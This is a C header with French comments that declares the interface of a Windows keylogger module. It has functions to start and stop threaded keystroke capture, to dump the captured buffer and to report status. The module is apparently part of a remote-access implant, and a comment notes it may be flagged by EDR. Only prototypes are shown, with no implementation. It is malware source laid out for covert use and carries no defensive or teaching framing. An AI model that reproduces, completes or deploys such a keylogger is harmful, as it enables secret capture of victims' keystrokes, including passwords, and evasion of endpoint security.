#ifndef KEYLOG_H
#define KEYLOG_H

#include <windows.h>

/**
 * Module Keylogger - Capture des frappes clavier
 * Thread dédié + buffer thread-safe
 */

// Codes de retour
#define KEYLOG_SUCCESS 0
#define KEYLOG_ERROR_ALREADY_RUNNING 1
#define KEYLOG_ERROR_NOT_RUNNING 2
#define KEYLOG_ERROR_THREAD 3
#define KEYLOG_ERROR_BUFFER_FULL 4

// Taille max du buffer (128 KB)
#define KEYLOG_BUFFER_SIZE (128 * 1024)

/**
 * Démarre la capture des frappes clavier
 *
 * Lance un thread dédié qui capture en continu
 * Les frappes sont stockées dans un buffer interne
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return KEYLOG_SUCCESS ou code d'erreur
 *
 * ATTENTION: Très suspect, peut être détecté par EDR
 */
int keylog_start(char *output, size_t size);

/**
 * Arrête la capture des frappes
 *
 * Termine le thread de capture proprement
 * Le buffer n'est PAS vidé (utilisez dump avant stop si besoin)
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return KEYLOG_SUCCESS ou code d'erreur
 */
int keylog_stop(char *output, size_t size);

/**
 * Récupère et vide le buffer de frappes capturées
 *
 * Retourne toutes les frappes capturées depuis le dernier dump
 * Le buffer est vidé après lecture
 *
 * @param output Buffer pour stocker les frappes
 * @param size Taille du buffer
 * @return KEYLOG_SUCCESS ou code d'erreur
 */
int keylog_dump(char *output, size_t size);

/**
 * Vérifie le statut du keylogger
 *
 * Indique si le keylogger est actif ou non
 * Affiche aussi la taille du buffer actuel
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return KEYLOG_SUCCESS
 */
int keylog_status(char *output, size_t size);

#endif // KEYLOG_H
